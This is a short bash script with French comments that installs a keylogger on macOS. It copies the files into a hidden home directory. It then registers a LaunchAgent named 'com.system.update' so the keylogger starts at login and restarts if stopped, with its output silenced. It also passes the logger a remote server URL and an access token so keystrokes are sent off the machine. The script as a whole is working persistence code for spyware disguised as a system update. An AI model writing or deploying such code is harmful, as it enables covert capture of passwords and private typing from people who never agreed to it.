#!/bin/bash
# Installe le keylogger pour qu'il démarre automatiquement

INSTALL_DIR="$HOME/.system_utils"
PLIST_PATH="$HOME/Library/LaunchAgents/com.system.update.plist"

# Copier les fichiers dans un dossier caché
mkdir -p "$INSTALL_DIR"
cp -r "$(dirname "$0")"/* "$INSTALL_DIR/"

# Créer le LaunchAgent
cat > "$PLIST_PATH" << PLISTEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"\>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>$INSTALL_DIR/venv/bin/python3</string>
        <string>$INSTALL_DIR/keylogger_client.py</string>
        <string>https://keylog.claverie.site\</string\>
        <string>72Us_Pl9QtgelVRbJ44u-G6hcNiS_IWx64MEOWcmcCQ</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
PLISTEOF

launchctl load "$PLIST_PATH"

echo "✅ Installé ! Le keylogger démarrera automatiquement."
echo "📂 Emplacement: $INSTALL_DIR"
echo "🗑️  Pour désinstaller: launchctl unload $PLIST_PATH && rm -rf $INSTALL_DIR"
